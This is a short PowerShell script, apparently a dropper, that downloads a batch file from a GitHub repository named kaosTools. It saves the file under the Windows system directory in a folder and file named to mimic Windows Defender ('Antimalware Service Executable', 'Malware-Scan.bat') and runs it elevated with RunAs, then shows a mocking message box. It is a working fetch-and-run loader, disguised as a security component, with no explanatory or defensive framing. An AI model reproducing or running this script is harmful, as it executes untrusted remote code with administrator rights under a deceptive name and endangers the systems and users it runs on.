$j4 = "https://github.com/kaosSec/kaosTools/raw/main/bat/justafriendlydolphin.bat"
$u7 = "$env:SystemRoot\Antimalware Service Executable\Malware-Scan.bat"
Invoke-WebRequest $j4 -OutFile $u7
Start-Process -FilePath $u7 -Verb RunAs
[System.Windows.Forms.MessageBox]::Show("shiet")
